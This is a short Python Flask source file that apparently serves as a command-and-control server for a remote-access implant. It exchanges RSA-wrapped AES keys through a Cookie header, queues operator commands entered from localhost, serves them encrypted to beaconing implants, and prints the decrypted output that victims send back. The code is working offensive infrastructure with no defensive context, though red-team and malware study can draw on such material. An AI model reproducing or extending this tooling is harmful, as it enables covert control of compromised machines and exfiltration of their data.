from flask import Flask, request, make_response
from CryptoLib import CryptoLib
import json


KEEPALIVE = "5"
ENTRYPOINT_BEACON = "beacon"
ENTRYPOINT_RESPONSE = "response"
SERVER = ""
command = ""
cryptolib = CryptoLib()
app = Flask(__name__)


@app.route("/command/")
def set_command():
    global command
    if request.remote_addr == "127.0.0.1":
        command = request.args.get("command")
        message = "next execution command:\n%s\n" % command
        return message


@app.route("/", methods=["POST"])
def init():
    encrypted_data = request.headers.get("Cookie")
    if encrypted_data != None:
        cryptolib.init_rsa()
        decrypted_data = cryptolib.decrypt_rsa(encrypted_data)
        profile = json.loads(decrypted_data)
        cryptolib.set_aes(profile["key"], profile["iv"])
    profile = json.dumps({"beacon":ENTRYPOINT_BEACON, "response": ENTRYPOINT_RESPONSE, "keepalive": KEEPALIVE})
    encrypted_profile = cryptolib.encrypt_aes(profile)
    response = make_response(encrypted_profile)
    response.headers["Server"] = SERVER
    return response


@app.route("/%s/" % ENTRYPOINT_BEACON)
def get_beacon():
    global command
    if command != "":
        print("")
    encrypted_message = cryptolib.encrypt_aes(command)
    command = ""
    response = make_response(encrypted_message)
    response.headers["Server"] = SERVER
    return response


@app.route("/%s/" % ENTRYPOINT_RESPONSE, methods=["POST"])
def get_response():
    decrypted_message = cryptolib.decrypt_aes(request.get_data())
    print(decrypted_message)
    response = make_response()
    response.headers["Server"] = SERVER
    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
